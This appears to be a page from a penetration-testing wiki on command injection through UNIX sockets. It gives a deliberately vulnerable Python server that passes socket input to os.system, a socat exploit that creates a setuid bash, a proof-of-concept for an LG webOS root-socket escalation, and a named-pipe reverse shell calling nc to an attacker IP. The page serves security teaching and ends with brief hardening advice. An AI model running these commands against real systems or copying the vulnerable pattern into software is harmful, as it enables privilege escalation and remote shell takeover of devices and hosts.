# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

In the following example a **unix socket is created** (`/tmp/socket_test.s`) and everything **received** is going to be **executed** by `os.system`.I know that you aren't going to find this in the wild, but the goal of this example is to see how a code using unix sockets looks like, and how to manage the input in the worst case possible.

```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
  os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
  server.listen(1)
  conn, addr = server.accept()
  datagram = conn.recv(1024)
  if datagram:
    print(datagram)
    os.system(datagram)
    conn.close()
```

**Execute** the code using python: `python s.py` and **check how the socket is listening**:

```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```

**Exploit**

```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```

## Case study: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Some privileged daemons expose a root-owned UNIX socket that accepts untrusted input and couples privileged actions to thread-IDs and signals. If the protocol lets an unprivileged client influence which native thread is targeted, you may be able to trigger a privileged code path and escalate.

Observed pattern:
- Connect to a root-owned socket (e.g., /tmp/remotelogger).
- Create a thread and obtain its native thread id (TID).
- Send the TID (packed) plus padding as a request; receive an acknowledgement.
- Deliver a specific signal to that TID to trigger the privileged behaviour.

Minimal PoC sketch:

```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
 tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```

To turn this into a root shell, a simple named-pipe + nc pattern can be used:

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```

Notes:
- This class of bugs arises from trusting values derived from unprivileged client state (TIDs) and binding them to privileged signal handlers or logic.
- Harden by enforcing credentials on the socket, validating message formats, and decoupling privileged operations from externally supplied thread identifiers.

## References

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}




